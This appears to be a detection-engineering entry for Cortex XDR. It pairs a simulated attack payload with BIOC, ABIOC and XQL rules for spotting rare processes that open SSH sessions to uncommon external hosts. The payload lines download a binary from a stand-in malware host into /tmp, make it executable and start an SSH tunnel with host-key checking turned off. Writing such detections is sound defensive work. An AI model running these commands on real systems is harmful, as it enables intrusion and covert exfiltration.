identity.description: An attacker uses a rare process to initiate an SSH session to an uncommon external IP, likely for data exfiltration or command execution. Cortex should detect the unusual SSH process and connection to a non-standard host.

payload.code:
mkdir -p /tmp/ssh-tunnel
wget -O /tmp/ssh-tunnel/ssh_client https://malware.example.com/ssh_client
chmod 755 /tmp/ssh-tunnel/ssh_client
/tmp/ssh-tunnel/ssh_client -o StrictHostKeyChecking=no -f -N -L 8080:192.0.2.10:22 user@192.0.2.100

biocs.name: Rare Process Created SSH Session to Uncommon Host
biocs.description: Detection of a rare process initiating an SSH session to an external IP not typically seen in the environment
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains 'ssh'
| filter actor_process_image_name not in ('sshd', 'systemd', 'cron')
| comp count() as events by actor_process_image_name, agent_hostname
| sort desc events

abiocs.name: SSH Session from Rare Process to Uncommon External IP
abiocs.description: Behavioral deviation where a rare process initiates SSH connection to an uncommon external host
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains 'ssh'
| filter actor_process_image_name not in ('sshd', 'systemd', 'cron')
| comp count() as events by actor_process_image_name, agent_hostname
| sort desc events

xql_queries.name: SSH Sessions to Uncommon IPs
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and network_direction = ENUM.OUTBOUND
| filter dst_port = 22
| filter action_process_image_name contains 'ssh'
| filter actor_process_image_name not in ('sshd', 'systemd', 'cron')
| comp count() as events by actor_process_image_name, agent_hostname
| sort desc events
